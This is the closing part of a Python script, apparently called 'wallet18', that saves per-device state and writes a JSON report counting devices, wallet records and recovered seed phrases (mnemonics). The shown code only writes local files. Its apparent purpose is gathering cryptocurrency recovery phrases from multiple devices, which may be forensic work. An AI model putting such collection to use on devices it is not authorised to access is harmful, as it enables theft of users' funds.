            new_state[serial] = {'sig': _file_sig(allb), 'ts': int(time.time()), 'res': out.get(serial, {})}
        os.makedirs(os.path.dirname(STATE), exist_ok=True)
        _st = STATE + '.tmp'
        json.dump({'_state': new_state, '_led': sorted(led)}, open(_st, 'w', encoding='utf-8'), ensure_ascii=False)
        os.replace(_st, STATE)
    except Exception as _se:
        print('[wallet18] 状态写回失败（不影响主输出）:', _se)

    os.makedirs(os.path.dirname(OUT), exist_ok=True)
    tmp = OUT + '.tmp'
    json.dump(out, open(tmp, 'w', encoding='utf-8'), ensure_ascii=False, indent=2)
    os.replace(tmp, OUT)
    tot_w = sum(len(v['wallets']) for v in out.values())
    tot_m = sum(1 for v in out.values() for w in v['wallets'] if w.get('mnemonic'))
    print('[wallet18] 完成：%d 台设备 / %d 条钱包记录 / %d 个助记词 → %s' % (len(out), tot_w, tot_m, OUT))


if __name__ == '__main__':
    main()
